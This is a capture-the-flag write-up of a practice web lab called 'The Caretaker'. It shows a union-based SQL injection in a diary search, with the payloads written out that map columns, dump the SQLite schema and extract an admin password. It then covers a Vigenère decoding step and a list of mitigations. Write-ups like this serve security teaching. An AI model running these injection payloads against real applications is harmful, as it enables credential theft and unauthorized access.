---
title: "SQL Injection to Admin Access – Hidden Identity Exposure | The Caretaker"
date: 2026-05-17 16:10:00 +0530
categories: [Web Security, SQL Injection]
tags: [sqli, sqlite, union-based-sqli, auth-bypass, information-disclosure, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/caretaker-beaumont-sqli.webp
  alt: SQL injection exploitation in diary search system
---

## Overview

The Caretaker lab simulates a public-facing archive system for Beaumont Psychiatric Hospital. The application exposes diary entries through a searchable interface that appears to be safely scoped to titles only.

However, deeper testing revealed a SQL injection vulnerability in the diary search endpoint, which ultimately led to admin access, sensitive user credential extraction, and identity disclosure of the mysterious figure known as "The Caretaker".

---

## Objective

To test the security of the diary search functionality and determine whether input validation and query handling properly prevent SQL injection and unauthorized data access.

## Lab Link

- Lab: [The Caretaker](https://dashboard.webverselabs-pro.com/mystery-challenges/the-caretaker)

---

## Reconnaissance

Directory and endpoint enumeration revealed the following structure:

```
/diary/search
/home
/diary
/diary/<note_id>
/admin/login
```

The `/diary/search` endpoint appeared to be the most promising input vector for testing.

---

## Exploitation

### Initial Injection Test

The search parameter was tested with a basic SQL injection payload:

```sql
' or 1=1-- -
```

This confirmed injectable behavior, indicating unsanitized input being directly passed into a SQL query.

### Column Discovery

To identify the number of columns:

```sql
' order by 5-- -
```

The application responded normally, confirming at least 5 columns.

### Union-Based Structure Mapping

A UNION SELECT test was performed:

```sql
' union select 'A','B','C','D','E'-- -
```

The response reflected:

```
B
C — D
E...
```

This confirmed the injectable columns and response mapping.

### Database Enumeration (SQLite)

Further extraction targeted the database schema:

```sql
' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='orders'-- -
```

This revealed table structure details from the SQLite master table.

### Credential Extraction

User credentials were extracted from the users table:

```sql
' UNION SELECT 1,username||':'||password,3,4,5 FROM users-- -
```

Result:

```
admin:bloodmoon666
```

This confirmed direct credential exposure due to SQL injection.

---

## Authentication Bypass

Using the extracted credentials, access was gained to:

```
/admin/login
```

After login, a new endpoint became available:

```
/whoami
```

---

## Deeper Exploration

Inside the admin panel, a note was discovered:

```
/admin/entry/5
```

### Hidden Entry Content

```
My True Name
Author: The Caretaker
Date: 1995
Real name: Igida Iuds ......Ha ha ha.
You really thought I'd give you my name that easily?
```

A hidden hint suggested that the identity could be decoded using additional information.

---

## Hidden Clue Discovery

Page source inspection revealed:

```html
<!-- This key might be useful: evadinglawenforcement -->
```

This indicated a cipher-based challenge using a keyword.

---

## Cipher Analysis

The string:

```
Igida Iuds
```

was decoded using a Vigenère cipher with the key:

```
evadinglawenforcement
```

Using a tool such as CyberChef, the decrypted result was:

```
Elias Voss
```

---

## Final Validation

The decoded identity was submitted to:

```
/whoami
```

This endpoint validated the identity and returned the final flag.

```
WEBVERSE{.....}
```

---

## Impact

This vulnerability chain demonstrates multiple critical issues:

- SQL Injection in search functionality
- Full database exposure via UNION-based extraction
- Credential leakage (admin account compromise)
- Authentication bypass
- Sensitive internal note disclosure
- Hidden cryptographic identity recovery
- Final privilege escalation leading to flag retrieval

---

## Root Cause

- Unsanitized input in SQL query construction
- Direct exposure of database schema via SQLite master table
- Weak authentication relying on exposed credentials
- Sensitive data stored in retrievable plaintext or weakly protected format

---

## Mitigation

To prevent similar issues:

- Use parameterized queries for all database interactions
- Disable verbose SQL error responses
- Restrict access to `sqlite_master` and schema metadata
- Enforce strong password hashing (bcrypt/argon2)
- Avoid storing secrets in plaintext or reversible formats
- Apply strict access control to admin-only endpoints
- Remove sensitive comments from production code
- Harden authentication flows and session validation

---

## Real-World Insight

This lab combines classic SQL injection with layered narrative-style security weaknesses. While the initial flaw is simple, the real risk comes from chaining:

Injection → Credential leak → Admin access → Hidden data → Cipher decoding

In real systems, attackers often follow this exact progression, moving from one low-level issue to full identity compromise.

---

## Conclusion

A single injection point in a search feature cascaded into full administrative compromise and identity exposure of a long-hidden figure. The lab highlights how fragile trust boundaries become when input validation is missing at the database layer.